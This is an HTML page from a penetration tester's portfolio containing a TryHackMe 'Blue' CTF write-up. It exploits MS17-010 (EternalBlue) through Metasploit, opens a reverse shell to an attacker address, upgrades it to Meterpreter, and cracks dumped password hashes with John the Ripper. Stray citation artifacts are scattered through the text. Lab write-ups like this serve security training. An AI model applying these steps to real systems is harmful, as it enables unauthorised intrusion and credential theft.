@@ -1,0 +1,283 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEXEN - Penetration Tester & Penetration Tester Portfolio"
+		/>
+		<title>HEXEN // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEXEN"
+							>HEXEN</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+
+					<!-- Desktop Menu -->
+					<div class="hidden md:flex space-x-6">
+						<a href="../" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+
+					<!-- Mobile Menu Button -->
+					<div class="md:hidden mt-4">
+						<button
+							id="mobile-menu-button"
+							type="button"
+							class="text-neongreen focus:outline-none"
+						>
+							<svg
+								class="h-6 w-6 transition-transform duration-300"
+								id="menu-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M4 6h16M4 12h16M4 18h16"
+								></path>
+							</svg>
+							<svg
+								class="h-6 w-6 transition-transform duration-300 hidden"
+								id="close-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M6 18L18 6M6 6l12 12"
+								></path>
+							</svg>
+						</button>
+					</div>
+				</div>
+
+				<!-- Mobile Menu (hidden by default) -->
+				<div
+					id="mobile-menu"
+					class="md:hidden mt-2 border-t border-neongreen border-opacity-30 transform origin-top transition-all duration-300 scale-y-0 opacity-0 max-h-0"
+				>
+					<div class="flex flex-col space-y-4">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<section id="writeup-controls" class="px-6 pt-6 pb-2 text-center">
+  
+
+  <div id='tags-container'>
+    
+  </div>
+</section>
+
+<!-- Writeup content -->
+<article class="markdown-body"><h1>TryHackMe | Blue CTF Writeup</h1>
+<p>This writeup documents the steps taken to solve the <strong>Blue</strong> room on TryHackMe.<br>The challenge focuses on exploiting the <strong>MS17-010 (EternalBlue)</strong> vulnerability using Metasploit to gain system access on a Windows machine. :contentReference[oaicite:0]{index=0}</p>
+<hr>
+<h2>Challenge Information</h2>
+<ul>
+<li><strong>Platform:</strong> TryHackMe  </li>
+<li><strong>Room:</strong> Blue  </li>
+<li><strong>Category:</strong> Exploitation / Windows  </li>
+<li><strong>Difficulty:</strong> Beginner</li>
+</ul>
+<hr>
+<h2>Recon</h2>
+<p>The first step was performing a port and service scan to identify exposed services.</p>
+<pre><code class="language-bash">nmap -sV -sC &lt;target-ip&gt;
+</code></pre>
+<p>The scan revealed several SMB-related ports:</p>
+<ul>
+<li><code>135/tcp</code></li>
+<li><code>139/tcp</code></li>
+<li><code>445/tcp</code></li>
+</ul>
+<p>These ports are commonly associated with <strong>Windows SMB services</strong>, which are known to be vulnerable to the <strong>MS17-010 EternalBlue exploit</strong>. :contentReference[oaicite:1]{index=1}</p>
+<p>To confirm the vulnerability, the following Nmap script can be used:</p>
+<pre><code class="language-bash">nmap -sV -sC --script smb-vuln-ms17-010.nse &lt;target-ip&gt;
+</code></pre>
+<hr>
+<h2>Enumeration</h2>
+<p>Since the machine was vulnerable to <strong>MS17-010</strong>, exploitation could be performed using Metasploit.</p>
+<p>First, start the Metasploit framework:</p>
+<pre><code class="language-bash">msfconsole
+</code></pre>
+<p>Search for the EternalBlue exploit module:</p>
+<pre><code>search ms17-010
+</code></pre>
+<p>Multiple modules appear, but the relevant one is:</p>
+<pre><code>exploit/windows/smb/ms17_010_eternalblue
+</code></pre>
+<p>Load the module:</p>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+</code></pre>
+<hr>
+<h2>Exploitation</h2>
+<p>Before executing the exploit, configure the required options.</p>
+<p>First, set the payload for the reverse shell:</p>
+<pre><code>set payload windows/x64/shell/reverse_tcp
+</code></pre>
+<p>Next, configure the target and attacker addresses:</p>
+<pre><code>set RHOSTS &lt;target-ip&gt;
+set LHOST &lt;attacker-ip&gt;
+</code></pre>
+<p>Verify the module configuration:</p>
+<pre><code>show options
+</code></pre>
+<p>Once everything is configured, run the exploit:</p>
+<pre><code>run
+</code></pre>
+<p>If successful, a reverse shell will open on the attacker machine. The exploit may take several attempts depending on network conditions. :contentReference[oaicite:2]{index=2}</p>
+<p>After the shell is obtained, verify the privileges:</p>
+<pre><code>whoami
+</code></pre>
+<p>If the output shows:</p>
+<pre><code>nt authority\system
+</code></pre>
+<p>then the exploit has successfully provided SYSTEM-level access.</p>
+<hr>
+<h2>Shell Upgrade</h2>
+<p>The initial shell can be upgraded to a Meterpreter shell for improved functionality.</p>
+<p>First, background the current session:</p>
+<pre><code>CTRL + Z
+</code></pre>
+<p>Search for the shell upgrade module:</p>
+<pre><code>search shell_to_meterpreter
+</code></pre>
+<p>Load the module:</p>
+<pre><code>use post/multi/manage/shell_to_meterpreter
+</code></pre>
+<p>Set the required options:</p>
+<pre><code>set SESSION 1
+set LHOST &lt;attacker-ip&gt;
+</code></pre>
+<p>Run the module to upgrade the shell.</p>
+<p>Afterward, list sessions:</p>
+<pre><code>sessions -l
+</code></pre>
+<p>Interact with the new Meterpreter session:</p>
+<pre><code>sessions 2
+</code></pre>
+<p>If successful, the prompt will change to <code>meterpreter</code>.</p>
+<hr>
+<h2>Privilege Verification</h2>
+<p>Within the Meterpreter session, verify system information:</p>
+<pre><code>sysinfo
+</code></pre>
+<p>Check running processes:</p>
+<pre><code>ps
+</code></pre>
+<p>Confirm elevated privileges:</p>
+<pre><code>getsystem
+</code></pre>
+<p>These commands confirm that the attacker has SYSTEM-level access to the machine. :contentReference[oaicite:3]{index=3}</p>
+<hr>
+<h2>Extracting Password Hashes</h2>
+<p>Using Meterpreter, password hashes can be extracted from the system.</p>
+<p>The relevant hash belongs to the user <strong>Jon</strong>.</p>
+<p>Once obtained, save the hash to a file and crack it using John the Ripper:</p>
+<pre><code class="language-bash">john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+</code></pre>
+<p>This reveals the password associated with the user account. :contentReference[oaicite:4]{index=4}</p>
+<hr>
+<h2>Retrieving the Flags</h2>
+<p>The machine contains three flags stored in different locations.</p>
+<p>Navigate to the root of the C drive to retrieve the first flag:</p>
+<pre><code>cd C:\
+type flag1.txt
+</code></pre>
+<p>The second flag can be found in:</p>
+<pre><code>C:\Windows\System32\Config
+</code></pre>
+<p>The third flag is located in the Documents directory of the user <strong>Jon</strong>:</p>
+<pre><code>C:\Users\Jon\Documents
+type flag3.txt
+</code></pre>
+<p>Each file contains one of the required flags for the challenge. :contentReference[oaicite:5]{index=5}</p>
+</article>
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEXEN_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEXEN. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+		<script type="module" src="../assets/js/menu.js" defer></script>
+	</body>
+</html>
